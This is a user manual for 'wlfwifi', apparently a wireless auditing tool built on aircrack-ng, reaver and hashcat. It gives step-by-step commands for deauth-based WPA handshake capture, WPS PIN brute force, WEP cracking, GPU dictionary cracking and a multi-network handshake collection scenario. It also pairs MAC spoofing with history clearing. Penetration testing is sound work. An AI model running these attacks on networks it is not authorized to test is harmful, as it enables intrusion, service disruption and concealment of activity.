# wlfwifi User Manual

## Complete Reference Guide for Wireless Network Security Auditing

**Version 1.0.0** | **Last Updated: January 2026**

---

## 📋 Table of Contents

1. [Introduction](#1-introduction)
2. [System Requirements](#2-system-requirements)
3. [Installation](#3-installation)
4. [Quick Start Guide](#4-quick-start-guide)
5. [Command Line Reference](#5-command-line-reference)
6. [Core Concepts](#6-core-concepts)
7. [Network Discovery](#7-network-discovery)
8. [Attack Types](#8-attack-types)
9. [Usage Scenarios](#9-usage-scenarios)
10. [Capture Files](#10-capture-files)
11. [Python API Reference](#11-python-api-reference)
12. [Troubleshooting](#12-troubleshooting)
13. [Security Considerations](#13-security-considerations)
14. [Appendices](#14-appendices)

---

## 1. Introduction

### 1.1 What is wlfwifi?

**wlfwifi** is a modern, modular, and automated wireless network security auditing tool designed for security professionals, penetration testers, and network administrators. It provides automated testing capabilities for:

- **WEP** (Wired Equivalent Privacy) networks
- **WPA/WPA2** (Wi-Fi Protected Access) networks
- **WPS** (Wi-Fi Protected Setup) enabled access points

### 1.2 Key Features

| Feature | Description |
|---------|-------------|
| **Automated Scanning** | Discovers all nearby wireless networks automatically |
| **Multi-Protocol Support** | Tests WEP, WPA/WPA2, and WPS vulnerabilities |
| **Handshake Capture** | Automatically captures WPA 4-way handshakes |
| **WPS PIN Attack** | Brute-force and Pixie Dust WPS attacks |
| **MAC Anonymization** | Optional MAC address randomization |
| **Modular Architecture** | Clean, extensible Python 3.7+ codebase |
| **Comprehensive Logging** | Detailed verbose output for analysis |

### 1.3 Legal Disclaimer

> ⚠️ **WARNING**: This tool is intended for **authorized security testing and educational purposes only**. Unauthorized access to computer networks is illegal in most jurisdictions and can result in criminal prosecution, fines, and imprisonment. Always obtain explicit written authorization before testing any network you do not own.

---

## 2. System Requirements

### 2.1 Operating System

| Requirement | Supported |
|-------------|-----------|
| **Linux** | ✅ Fully supported (Kali, Parrot, Ubuntu, Debian, Arch) |
| **Windows** | ⚠️ Limited (development/testing only, no wireless attacks) |
| **macOS** | ⚠️ Limited (monitor mode restrictions) |

### 2.2 Hardware Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **RAM** | 512 MB | 2 GB+ |
| **Storage** | 100 MB | 500 MB+ (for captures) |
| **Wireless Card** | Monitor mode support | Monitor mode + packet injection |
| **Processor** | 1 GHz | 2+ GHz multi-core |

### 2.3 Compatible Wireless Adapters

**Recommended Chipsets:**
- Atheros AR9271 (ALFA AWUS036NHA)
- Ralink RT3070 (ALFA AWUS036NH)
- Realtek RTL8812AU (ALFA AWUS036ACH)
- Intel Wireless (varies by model)

**Checking Monitor Mode Support:**
```bash
# Check supported modes
iw list | grep -A 10 "Supported interface modes"

# Look for "monitor" in output
#   * monitor
```

### 2.4 Required External Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| `aircrack-ng` | WPA/WEP cracking suite | `sudo apt install aircrack-ng` |
| `airodump-ng` | Network scanner | (included with aircrack-ng) |
| `aireplay-ng` | Packet injection | (included with aircrack-ng) |
| `airmon-ng` | Monitor mode control | (included with aircrack-ng) |
| `tshark` | Packet analysis | `sudo apt install tshark` |
| `reaver` | WPS attacks | `sudo apt install reaver` |

### 2.5 Optional Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| `hashcat` | GPU password cracking | `sudo apt install hashcat` |
| `pyrit` | GPU-accelerated WPA | `sudo apt install pyrit` |
| `cowpatty` | WPA dictionary attacks | `sudo apt install cowpatty` |
| `macchanger` | MAC address spoofing | `sudo apt install macchanger` |
| `hcxtools` | Capture conversion | `sudo apt install hcxtools` |

---

## 3. Installation

### 3.1 Quick Installation (Recommended)

```bash
# Clone the repository
git clone https://github.com/yourusername/wlfwifi.git
cd wlfwifi

# Create virtual environment (optional but recommended)
python3 -m venv .venv
source .venv/bin/activate

# Install wlfwifi
pip install -e .

# Verify installation
wlfwifi --help
```

### 3.2 Direct Execution (No Installation)

```bash
# Clone and run directly
git clone https://github.com/yourusername/wlfwifi.git
cd wlfwifi

# Run directly
sudo python3 wlfwifi.py --help
```

### 3.3 Development Installation

```bash
# Clone repository
git clone https://github.com/yourusername/wlfwifi.git
cd wlfwifi

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install with development dependencies
pip install -e .
pip install pytest black flake8

# Run tests to verify
pytest -v
```

### 3.4 Installing Dependencies (Debian/Ubuntu/Kali)

```bash
# Update package lists
sudo apt update

# Install required tools
sudo apt install -y aircrack-ng tshark reaver wireless-tools

# Install optional tools
sudo apt install -y macchanger cowpatty hashcat hcxtools

# Install Python 3.7+ if needed
sudo apt install -y python3 python3-pip python3-venv
```

### 3.5 Verifying Installation

```bash
# Check wlfwifi
wlfwifi --help
# Expected: Usage information displayed

# Check external tools
which aircrack-ng airodump-ng aireplay-ng airmon-ng tshark reaver

# Check Python version
python3 --version
# Expected: Python 3.7+
```

---

## 4. Quick Start Guide

### 4.1 First Run

```bash
# 1. Identify your wireless interface
iwconfig
# Note: Look for wlan0, wlan1, wlp2s0, etc.

# 2. Stop interfering processes
sudo airmon-ng check kill

# 3. Start wlfwifi
sudo python3 wlfwifi.py -i wlan0

# Or if installed via pip
sudo wlfwifi -i wlan0
```

### 4.2 Basic Scanning

```bash
# Scan all channels
sudo wlfwifi -i wlan0

# Scan specific channel
sudo wlfwifi -i wlan0 -c 6

# Scan with verbose output
sudo wlfwifi -i wlan0 -v
```

### 4.3 Example Session

```bash
$ sudo wlfwifi -i wlan0 -v

[2026-01-30 10:00:00] INFO: [wlfwifi] Starting with interface=wlan0, channel=None, verbose=True
[2026-01-30 10:00:01] INFO: Enabling monitor mode on wlan0...
[2026-01-30 10:00:02] INFO: Monitor mode enabled (wlan0mon)
[2026-01-30 10:00:02] INFO: Scanning for wireless networks...

NUM  ESSID              BSSID              CH   ENC     PWR   WPS   CLIENTS
---  -----              -----              --   ---     ---   ---   -------
1    HomeNetwork        00:11:22:33:44:55  6    WPA2    -45   Yes   3
2    OfficeWiFi         11:22:33:44:55:66  11   WPA2    -60   No    1
3    CafeGuest          22:33:44:55:66:77  1    WPA     -52   Yes   5
4    LegacyRouter       33:44:55:66:77:88  6    WEP     -48   No    2

Select target(s) [1-4, all]: 
```

---

## 5. Command Line Reference

### 5.1 Syntax

```
wlfwifi [-h] [-i INTERFACE] [-c CHANNEL] [-v]
```

### 5.2 Options

| Option | Long Form | Type | Default | Description |
|--------|-----------|------|---------|-------------|
| `-h` | `--help` | flag | - | Display help message and exit |
| `-i` | `--interface` | string | None | Wireless interface to use |
| `-c` | `--channel` | integer | None | Lock to specific channel |
| `-v` | `--verbose` | flag | False | Enable verbose output |

### 5.3 Option Details

#### `-i, --interface`

Specifies the wireless interface for scanning and attacks.

**Examples:**
```bash
# Standard interface names
sudo wlfwifi -i wlan0
sudo wlfwifi -i wlan1
sudo wlfwifi -i wlp2s0

# Interface already in monitor mode
sudo wlfwifi -i wlan0mon

# Using long form
sudo wlfwifi --interface wlan0
```

**Finding your interface:**
```bash
# Method 1: iwconfig
iwconfig 2>/dev/null | grep -E "^[a-z]"

# Method 2: iw
iw dev

# Method 3: ip link
ip link show | grep -E "wl[a-z]"
```

#### `-c, --channel`

Locks scanning to a specific Wi-Fi channel.

**2.4 GHz Channels (1-14):**
```bash
sudo wlfwifi -i wlan0 -c 1   # Channel 1
sudo wlfwifi -i wlan0 -c 6   # Channel 6 (common)
sudo wlfwifi -i wlan0 -c 11  # Channel 11 (common)
```

**5 GHz Channels:**
```bash
sudo wlfwifi -i wlan0 -c 36   # UNII-1
sudo wlfwifi -i wlan0 -c 40
sudo wlfwifi -i wlan0 -c 44
sudo wlfwifi -i wlan0 -c 48
sudo wlfwifi -i wlan0 -c 149  # UNII-3
sudo wlfwifi -i wlan0 -c 153
sudo wlfwifi -i wlan0 -c 157
sudo wlfwifi -i wlan0 -c 161
```

**Channel Reference Table:**

| Band | Channel Range | Common Non-Overlapping |
|------|---------------|------------------------|
| 2.4 GHz | 1-14 | 1, 6, 11 |
| 5 GHz UNII-1 | 36-48 | 36, 40, 44, 48 |
| 5 GHz UNII-2 | 52-64 | 52, 56, 60, 64 |
| 5 GHz UNII-2e | 100-144 | 100, 104, 108... |
| 5 GHz UNII-3 | 149-165 | 149, 153, 157, 161, 165 |

#### `-v, --verbose`

Enables detailed logging output.

```bash
sudo wlfwifi -i wlan0 -v
```

**Verbose output includes:**
- Exact commands being executed
- Process status and timing
- Detailed error messages with stack traces
- Network discovery progress
- Attack stage updates
- Debug information

### 5.4 Combined Options

```bash
# All options combined
sudo wlfwifi -i wlan0 -c 6 -v
sudo wlfwifi --interface wlan0 --channel 6 --verbose

# Module invocation
sudo python3 -m wlfwifi -i wlan0 -c 11 -v
```

---

## 6. Core Concepts

### 6.1 Monitor Mode

**What is Monitor Mode?**
Monitor mode allows a wireless card to capture all wireless traffic in range, not just traffic destined for your device.

**Enabling Monitor Mode:**
```bash
# Using airmon-ng (recommended)
sudo airmon-ng start wlan0
# Interface becomes wlan0mon

# Manual method
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
```

**Disabling Monitor Mode:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

### 6.2 Encryption Types

| Type | Security Level | Notes |
|------|----------------|-------|
| **OPN** | None | Open network, no encryption |
| **WEP** | Very Weak ⚠️ | Deprecated, easily cracked |
| **WPA** | Weak | Older, use WPA2 instead |
| **WPA2** | Strong | Current standard |
| **WPA3** | Very Strong | Latest standard |

### 6.3 WPS (Wi-Fi Protected Setup)

WPS is a feature that simplifies connecting devices to a network using an 8-digit PIN. However, it has known vulnerabilities:

- **Brute Force**: PIN can be guessed (11,000 combinations max)
- **Pixie Dust**: Some routers have weak random number generation
- **Rate Limiting**: Some routers lock after failed attempts

### 6.4 The 4-Way Handshake

WPA/WPA2 uses a 4-way handshake to establish encryption:

```
Client                           Access Point
   |                                   |
   |<---- ANonce (random number) ------|
   |                                   |
   |---- SNonce + MIC --------------->|
   |                                   |
   |<---- GTK + MIC ------------------|
   |                                   |
   |---- ACK ------------------------>|
```

Capturing this handshake allows offline password cracking.

### 6.5 Signal Strength (dBm)

| Range | Quality | Usability |
|-------|---------|-----------|
| -30 to -50 dBm | Excellent | Ideal for attacks |
| -50 to -60 dBm | Good | Reliable operation |
| -60 to -70 dBm | Fair | Slower but works |
| -70 to -80 dBm | Weak | Unreliable |
| Below -80 dBm | Poor | Move closer |

---

## 7. Network Discovery

### 7.1 Scanning for Networks

**Basic Scan:**
```bash
sudo wlfwifi -i wlan0
```

**Channel-Specific Scan:**
```bash
sudo wlfwifi -i wlan0 -c 6
```

### 7.2 Understanding Scan Output

```
NUM  ESSID              BSSID              CH   ENC     PWR   WPS   CLIENTS
---  -----              -----              --   ---     ---   ---   -------
1    HomeNetwork        00:11:22:33:44:55  6    WPA2    -45   Yes   3
2    OfficeWiFi         11:22:33:44:55:66  11   WPA2    -60   No    1
3    (hidden)           22:33:44:55:66:77  1    WPA2    -70   Yes   0
4    OldRouter          33:44:55:66:77:88  6    WEP     -55   No    2
```

| Column | Description |
|--------|-------------|
| **NUM** | Selection number for targeting |
| **ESSID** | Network name (empty/hidden if not broadcast) |
| **BSSID** | MAC address of access point |
| **CH** | Channel number |
| **ENC** | Encryption type (WEP, WPA, WPA2, OPN) |
| **PWR** | Signal strength in dBm |
| **WPS** | WPS enabled (Yes/No) |
| **CLIENTS** | Number of connected clients |

### 7.3 Hidden Networks

Networks with hidden SSIDs appear as `(hidden)` or blank ESSID. They can still be detected and attacked.

```
3    (hidden)           22:33:44:55:66:77  1    WPA2    -70   Yes   0
```

### 7.4 Target Selection Criteria

**Best targets for testing:**
- Strong signal (PWR > -60)
- Has connected clients (for handshake capture)
- WPS enabled (for WPS attacks)
- WEP encryption (easily cracked)

---

## 8. Attack Types

### 8.1 WPA/WPA2 Handshake Capture

**Purpose:** Capture the 4-way handshake for offline password cracking.

**Requirements:**
- Target network with connected clients
- Good signal strength

**Process:**
1. Monitor target network
2. Send deauthentication packets to clients
3. Capture handshake when clients reconnect
4. Crack offline with wordlist

**Example:**
```bash
# Start attack
sudo wlfwifi -i wlan0 -c 6

# Select WPA2 target
Select target(s): 1

# Wait for handshake capture
[+] Sending deauth to clients...
[+] Waiting for handshake...
[+] Handshake captured: hs/HomeNetwork_001122334455.cap
```

**Cracking the capture:**
```bash
# With aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt hs/HomeNetwork_*.cap

# With hashcat (faster, GPU)
hcxpcapngtool -o hash.hc22000 hs/HomeNetwork_*.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### 8.2 WPS PIN Attack

**Purpose:** Exploit WPS vulnerabilities to recover WPA password.

**Requirements:**
- Target with WPS enabled
- WPS not locked

**Attack Types:**

| Attack | Speed | Success Rate |
|--------|-------|--------------|
| Pixie Dust | 1-5 minutes | Depends on router |
| Brute Force | 4-10 hours | High (if not locked) |

**Example:**
```bash
# Scan for WPS-enabled networks
sudo wlfwifi -i wlan0

# Select WPS target (shows "Yes" in WPS column)
Select target(s): 1

# Attack progress
[+] Starting WPS attack on HomeNetwork
[+] Trying PIN: 12345670 (1/11000)
[+] Trying PIN: 12345671 (2/11000)
...
[+] WPS PIN found: 54321098
[+] WPA PSK: MySecretPassword123!
```

### 8.3 WEP Cracking

**Purpose:** Crack deprecated WEP encryption.

**Requirements:**
- Target using WEP
- Network traffic (or ARP injection)

**Process:**
1. Capture Initialization Vectors (IVs)
2. Inject ARP packets to generate traffic
3. Crack when sufficient IVs collected

**Example:**
```bash
# Find WEP network
sudo wlfwifi -i wlan0

# Select WEP target
Select target(s): 4

# Capture IVs
[+] Capturing IVs: 15,000 / 50,000
[+] Injecting ARP packets...
[+] Capturing IVs: 50,000 / 50,000
[+] Cracking WEP key...
[+] KEY FOUND: 1A:2B:3C:4D:5E
```

### 8.4 Attack Decision Tree

```
┌─────────────────────────────────────────────────────────────────┐
│                     Target Network                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │       What encryption?        │
              └───────────────────────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
    ┌───────┐           ┌──────────┐          ┌─────────┐
    │  WEP  │           │ WPA/WPA2 │          │   OPN   │
    └───────┘           └──────────┘          └─────────┘
        │                     │                     │
        ▼                     ▼                     ▼
  ┌──────────┐      ┌─────────────────┐      ┌──────────┐
  │ IV Attack│      │  WPS Enabled?   │      │ No attack│
  └──────────┘      └─────────────────┘      │  needed  │
                           │                 └──────────┘
               ┌───────────┴───────────┐
               ▼                       ▼
           ┌───────┐               ┌───────┐
           │  Yes  │               │  No   │
           └───────┘               └───────┘
               │                       │
               ▼                       ▼
        ┌────────────┐         ┌──────────────┐
        │ WPS Attack │         │  Handshake   │
        │(Pixie/Brute)│        │   Capture    │
        └────────────┘         └──────────────┘
```

---

## 9. Usage Scenarios

### Scenario 1: Home Network Security Audit

**Objective:** Test the security of your own home network.

```bash
# Step 1: Identify your network
sudo wlfwifi -i wlan0
# Note your network's ESSID, channel, and encryption

# Step 2: Run targeted test
sudo wlfwifi -i wlan0 -c 6 -v

# Step 3: Select your network
Select target(s): 1

# Step 4: Review results
# If handshake captured, try cracking with your password
aircrack-ng -w wordlist.txt hs/YourNetwork_*.cap
```

**Expected Results:**
- ✅ Handshake captured = Your network is vulnerable to dictionary attacks
- ✅ WPS PIN found = Disable WPS immediately
- ✅ WEP cracked = Upgrade to WPA2/WPA3 immediately

---

### Scenario 2: Corporate Penetration Test

**Objective:** Authorized security assessment of corporate wireless infrastructure.

**Prerequisites:**
- Written authorization from client
- Defined scope (specific networks)
- Documented rules of engagement

```bash
# Step 1: Comprehensive scan with logging
sudo wlfwifi -i wlan0 -v 2>&1 | tee wireless_audit_$(date +%Y%m%d).log

# Step 2: Document all discovered networks
# Save scan results for report

# Step 3: Test authorized targets only
sudo wlfwifi -i wlan0 -c 6

# Step 4: For each target, document:
# - Encryption type
# - WPS status
# - Vulnerabilities found
# - Recommendations
```

**Reporting Checklist:**
- [ ] Executive summary
- [ ] Methodology used
- [ ] Networks discovered
- [ ] Vulnerabilities found
- [ ] Evidence (captures, screenshots)
- [ ] Risk ratings
- [ ] Remediation recommendations

---

### Scenario 3: Wireless Security Education

**Objective:** Learn wireless security concepts in a lab environment.

```bash
# Step 1: Set up a test access point
# Use old router with WEP, WPA, and WPS enabled

# Step 2: Basic scanning exercise
sudo wlfwifi -i wlan0 -v
# Observe: Network discovery process

# Step 3: WEP cracking exercise
sudo wlfwifi -i wlan0 -c 1
# Select WEP network
# Learn: IV collection and cracking process

# Step 4: WPA handshake exercise
sudo wlfwifi -i wlan0 -c 6
# Learn: Deauth and handshake capture

# Step 5: WPS attack exercise
sudo wlfwifi -i wlan0 -c 11
# Learn: PIN brute force process
```

---

### Scenario 4: Rogue Access Point Detection

**Objective:** Identify unauthorized access points in your environment.

```bash
# Step 1: Create baseline of authorized networks
sudo wlfwifi -i wlan0 -v > baseline_$(date +%Y%m%d).txt

# Step 2: Regular scanning
sudo wlfwifi -i wlan0 -v > current_scan.txt

# Step 3: Compare scans
diff baseline_*.txt current_scan.txt

# Step 4: Investigate new networks
# - Check MAC address vendor
# - Verify with IT department
# - Locate physical device if unauthorized
```

---

### Scenario 5: Multi-Channel Survey

**Objective:** Complete wireless survey of an environment.

```bash
# Step 1: Scan 2.4 GHz channels
for ch in 1 6 11; do
    echo "=== Channel $ch ===" >> survey.txt
    sudo timeout 30 wlfwifi -i wlan0 -c $ch >> survey.txt 2>&1
done

# Step 2: Scan 5 GHz channels
for ch in 36 40 44 48 149 153 157 161; do
    echo "=== Channel $ch ===" >> survey.txt
    sudo timeout 30 wlfwifi -i wlan0 -c $ch >> survey.txt 2>&1
done

# Step 3: Analyze results
cat survey.txt | grep -E "ESSID|BSSID|WPS"
```

---

### Scenario 6: Targeted WPS Assessment

**Objective:** Test all WPS-enabled access points.

```bash
# Step 1: Find WPS-enabled networks
sudo wlfwifi -i wlan0 | grep "Yes"

# Step 2: Test each WPS network
# For each target:
sudo wlfwifi -i wlan0 -c <channel>
# Select WPS-enabled target

# Step 3: Document results
# - PIN found: CRITICAL vulnerability
# - Locked out: Rate limiting working (good)
# - Timeout: WPS might be fake-enabled
```

---

### Scenario 7: Handshake Collection Campaign

**Objective:** Collect handshakes from multiple networks for testing.

```bash
# Step 1: Scan environment
sudo wlfwifi -i wlan0

# Step 2: Target networks with clients
# Focus on networks with CLIENTS > 0

# Step 3: Collect handshakes
# For each target:
sudo wlfwifi -i wlan0 -c <channel>
# Select target, wait for handshake

# Step 4: Organize captures
ls -la hs/
# Move to organized structure:
mkdir -p captures/$(date +%Y%m%d)
mv hs/*.cap captures/$(date +%Y%m%d)/
```

---

### Scenario 8: Weak Password Discovery

**Objective:** Test network passwords against common wordlists.

```bash
# Step 1: Capture handshakes
sudo wlfwifi -i wlan0 -c 6
# Collect handshakes from target networks

# Step 2: Test against common passwords
# Quick test with top passwords
aircrack-ng -w /usr/share/wordlists/fasttrack.txt hs/*.cap

# Step 3: Full dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt hs/*.cap

# Step 4: GPU-accelerated attack
hcxpcapngtool -o hashes.hc22000 hs/*.cap
hashcat -m 22000 hashes.hc22000 rockyou.txt -O

# Step 5: Rule-based attack
hashcat -m 22000 hashes.hc22000 rockyou.txt -r best64.rule
```

---

### Scenario 9: Hidden Network Discovery

**Objective:** Find and identify hidden networks.

```bash
# Step 1: Scan for hidden networks
sudo wlfwifi -i wlan0 -v

# Look for entries with empty ESSID or "(hidden)"
# Note BSSID and channel

# Step 2: Deauth clients to reveal SSID
# When clients reconnect, SSID is exposed in probe requests

# Step 3: Use airodump-ng for detailed view
sudo airodump-ng wlan0mon -c <channel> --bssid <BSSID>
# Watch for ESSID to appear when clients connect
```

---

### Scenario 10: Emergency Response - Rogue AP

**Objective:** Quickly locate and disable rogue access point.

```bash
# Step 1: Identify rogue AP
sudo wlfwifi -i wlan0 -v
# Note suspicious network BSSID and channel

# Step 2: Lock to rogue AP channel
sudo wlfwifi -i wlan0 -c <channel>

# Step 3: Track signal strength
# Move around while monitoring PWR
# Stronger signal = closer to AP

# Step 4: Physical location
# Use directional antenna if available
# Check for unauthorized devices

# Step 5: Document and report
# - Screenshot of scan results
# - Physical location if found
# - MAC address for network ACL
```

---

## 10. Capture Files

### 10.1 File Locations

```
./                          # Current directory
./hs/                       # Handshake captures
./hs/NetworkName_BSSID.cap  # Individual capture files
```

### 10.2 File Types

| Extension | Description | Use |
|-----------|-------------|-----|
| `.cap` | Packet capture | Handshakes, WEP IVs |
| `.csv` | Airodump CSV | Network listings |
| `.hc22000` | Hashcat format | GPU cracking |
| `.pcap` | Packet capture | Analysis with Wireshark |

### 10.3 Working with Captures

**Listing captures:**
```bash
ls -la hs/
```

**Checking for valid handshake:**
```bash
aircrack-ng hs/NetworkName_001122334455.cap
# Look for "1 handshake" in output
```

**Converting for hashcat:**
```bash
hcxpcapngtool -o hash.hc22000 hs/capture.cap
```

**Viewing with tshark:**
```bash
tshark -r hs/capture.cap -Y "eapol"
```

**Viewing with Wireshark:**
```bash
wireshark hs/capture.cap
# Filter: eapol
```

### 10.4 Cracking Tools Comparison

| Tool | Speed | Requirements | Best For |
|------|-------|--------------|----------|
| aircrack-ng | Slow | CPU only | Quick tests |
| hashcat | Very Fast | GPU recommended | Large wordlists |
| pyrit | Fast | GPU | Batch processing |
| john | Medium | CPU | Rule-based attacks |

### 10.5 Example Cracking Commands

**Aircrack-ng (CPU):**
```bash
aircrack-ng -w wordlist.txt capture.cap
```

**Hashcat (GPU):**
```bash
# Convert capture
hcxpcapngtool -o hash.hc22000 capture.cap

# Dictionary attack
hashcat -m 22000 hash.hc22000 wordlist.txt

# With rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r best64.rule

# Brute force (8 chars)
hashcat -m 22000 hash.hc22000 -a 3 ?a?a?a?a?a?a?a?a
```

**Pyrit:**
```bash
pyrit -r capture.cap -i wordlist.txt attack_passthrough
```

---

## 11. Python API Reference

### 11.1 Package Overview

```python
import wlfwifi

# Version info
print(wlfwifi.__version__)  # "1.0.0"
print(wlfwifi.__author__)   # "derv82, ballastsec, Mike, and contributors"
```

### 11.2 Core Classes

#### RunConfig

Stores runtime configuration.

```python
from wlfwifi import RunConfig

# Create configuration
config = RunConfig(
    interface="wlan0",    # Wireless interface
    channel=6,            # Channel to lock to (None = all)
    verbose=True          # Enable verbose output
)

# Access attributes
print(config.interface)  # "wlan0"
print(config.channel)    # 6
print(config.verbose)    # True
```

#### Target

Represents a wireless network.

```python
from wlfwifi import Target

# Create target
target = Target(
    bssid="00:11:22:33:44:55",  # Access point MAC
    essid="HomeNetwork",         # Network name
    channel=6,                   # Channel
    encryption="WPA2",           # Encryption type
    wps=True                     # WPS enabled
)

# Access attributes
print(target.bssid)       # "00:11:22:33:44:55"
print(target.essid)       # "HomeNetwork"
print(target.channel)     # 6
print(target.encryption)  # "WPA2"
print(target.wps)         # True
```

#### Client

Represents a connected client device.

```python
from wlfwifi import Client

# Create client
client = Client(
    mac="AA:BB:CC:DD:EE:FF",           # Client MAC
    target_bssid="00:11:22:33:44:55"   # Associated AP
)

# Access attributes
print(client.mac)           # "AA:BB:CC:DD:EE:FF"
print(client.target_bssid)  # "00:11:22:33:44:55"
```

#### CapFile

Represents a capture file.

```python
from wlfwifi import CapFile

# Create capture file reference
cap = CapFile(
    path="/path/to/capture.cap",  # File path
    handshakes=4                   # Number of handshakes
)

# Access attributes
print(cap.path)        # "/path/to/capture.cap"
print(cap.handshakes)  # 4
```

### 11.3 Attack Classes

#### Attack (Abstract Base)

```python
from wlfwifi import Attack
import abc

class CustomAttack(Attack):
    def __init__(self, target):
        self.target = target
        self.running = False
    
    def RunAttack(self):
        """Start the attack."""
        self.running = True
        return f"Attacking {self.target.essid}"
    
    def EndAttack(self):
        """Stop the attack."""
        self.running = False
        return "Attack stopped"

# Usage
target = Target("00:11:22:33:44:55", "TestNet", 6, "WPA2", False)
attack = CustomAttack(target)
print(attack.RunAttack())  # "Attacking TestNet"
print(attack.EndAttack())  # "Attack stopped"
```

### 11.4 Utility Functions

```python
from wlfwifi.utils import (
    sec_to_hms,
    add_commas,
    generate_random_mac,
    program_exists,
    remove_file,
    rename
)

# Time formatting
print(sec_to_hms(3661))        # "[1:01:01]"
print(sec_to_hms(0))           # "[0:00:00]"
print(sec_to_hms(-1))          # "[endless]"

# Number formatting
print(add_commas(1000000))     # "1,000,000"

# MAC address generation
old_mac = "00:11:22:33:44:55"
new_mac = generate_random_mac(old_mac)
print(new_mac)  # "00:11:22:xx:xx:xx" (random last 3 octets)

# Program existence check
print(program_exists("aircrack-ng"))  # True/False

# File operations
remove_file("/tmp/test.cap")           # Remove if exists
rename("/tmp/old.cap", "/tmp/new.cap") # Rename/move file
```

### 11.5 WPS Checking

```python
from wlfwifi import Target, wps_check_targets

# Create targets
targets = [
    Target("00:11:22:33:44:55", "Net1", 6, "WPA2", False),
    Target("11:22:33:44:55:66", "Net2", 11, "WPA2", False),
]

# Check for WPS (modifies targets in place)
wps_check_targets(targets, "/tmp/capture.cap", verbose=True)

# Check results
for t in targets:
    print(f"{t.essid}: WPS={t.wps}")
```

### 11.6 Main Entry Point

```python
from wlfwifi import main

# Run wlfwifi (reads sys.argv)
main()
```

---

## 12. Troubleshooting

### 12.1 Common Errors

#### "Interface not found"

```
Error: Interface 'wlan0' not found
```

**Solutions:**
```bash
# List available interfaces
ip link show
iwconfig

# Check interface name (might be wlp2s0, wlxXXXX, etc.)
iw dev
```

#### "Permission denied"

```
Error: Operation not permitted
```

**Solution:**
```bash
# Always run with sudo
sudo wlfwifi -i wlan0
```

#### "Monitor mode not supported"

```
Error: Failed to enable monitor mode
```

**Solutions:**
```bash
# Check if card supports monitor mode
iw list | grep -A 10 "Supported interface modes"

# Try manual monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Use compatible wireless adapter
```

#### "No networks found"

**Possible causes:**
- Interface not in monitor mode
- Wrong interface specified
- No networks in range
- Driver issues

**Solutions:**
```bash
# Verify monitor mode
iwconfig

# Kill interfering processes
sudo airmon-ng check kill

# Try without channel lock
sudo wlfwifi -i wlan0

# Check driver
dmesg | tail -20
```

#### "Handshake not captured"

**Possible causes:**
- No clients connected
- Clients not reconnecting
- Weak signal
- Deauth not working

**Solutions:**
```bash
# Wait for client activity
# Move closer to target
# Use verbose mode
sudo wlfwifi -i wlan0 -v

# Try manual deauth
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
```

#### "WPS attack not working"

**Possible causes:**
- WPS locked out
- WPS not actually enabled
- Rate limiting

**Solutions:**
```bash
# Wait for lockout to expire (5-60 minutes)
# Verify WPS status
wash -i wlan0mon

# Try Pixie Dust attack (faster)
```

### 12.2 Diagnostic Commands

```bash
# Check wireless interface status
iwconfig

# Check monitor mode support
iw list | grep -A 10 "Supported interface modes"

# List wireless interfaces
iw dev

# Check for interfering processes
sudo airmon-ng check

# View kernel messages
dmesg | tail -50

# Check USB wireless adapter
lsusb

# Check PCI wireless adapter
lspci | grep -i wireless

# Test packet injection
sudo aireplay-ng --test wlan0mon
```

### 12.3 Reset Procedures

**Reset wireless interface:**
```bash
sudo ip link set wlan0 down
sudo ip link set wlan0 up
```

**Reset NetworkManager:**
```bash
sudo systemctl restart NetworkManager
```

**Reset after wlfwifi:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

**Full reset:**
```bash
sudo airmon-ng check kill
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
sudo systemctl start NetworkManager
sudo systemctl start wpa_supplicant
```

---

## 13. Security Considerations

### 13.1 Legal Requirements

⚠️ **CRITICAL**: Unauthorized network access is illegal.

**Legal use requires:**
- Network ownership, OR
- Written authorization from owner

**Authorization should include:**
- Specific networks in scope
- Permitted testing methods
- Testing timeframe
- Emergency contacts
- Signatures

### 13.2 Ethical Guidelines

1. **Only test authorized networks**
2. **Minimize impact** on network availability
3. **Protect captured data** securely
4. **Report vulnerabilities** responsibly
5. **Document everything** for accountability

### 13.3 Data Protection

**Secure your captures:**
```bash
# Encrypt capture files
gpg -c hs/sensitive_capture.cap

# Secure permissions
chmod 600 hs/*.cap

# Delete when done
shred -u hs/*.cap
```

### 13.4 Operational Security

```bash
# Randomize MAC address
sudo macchanger -r wlan0

# Use wlfwifi MAC anonymization
# (built-in feature when available)

# Clear history
history -c
```

---

## 14. Appendices

### Appendix A: Channel Reference

**2.4 GHz Channels:**

| Channel | Frequency (MHz) | Notes |
|---------|-----------------|-------|
| 1 | 2412 | Non-overlapping |
| 2 | 2417 | |
| 3 | 2422 | |
| 4 | 2427 | |
| 5 | 2432 | |
| 6 | 2437 | Non-overlapping |
| 7 | 2442 | |
| 8 | 2447 | |
| 9 | 2452 | |
| 10 | 2457 | |
| 11 | 2462 | Non-overlapping |
| 12 | 2467 | Not allowed in US |
| 13 | 2472 | Not allowed in US |
| 14 | 2484 | Japan only |

**5 GHz Channels:**

| Channel | Frequency (MHz) | Band |
|---------|-----------------|------|
| 36 | 5180 | UNII-1 |
| 40 | 5200 | UNII-1 |
| 44 | 5220 | UNII-1 |
| 48 | 5240 | UNII-1 |
| 52 | 5260 | UNII-2 (DFS) |
| 56 | 5280 | UNII-2 (DFS) |
| 60 | 5300 | UNII-2 (DFS) |
| 64 | 5320 | UNII-2 (DFS) |
| 100 | 5500 | UNII-2e (DFS) |
| 149 | 5745 | UNII-3 |
| 153 | 5765 | UNII-3 |
| 157 | 5785 | UNII-3 |
| 161 | 5805 | UNII-3 |
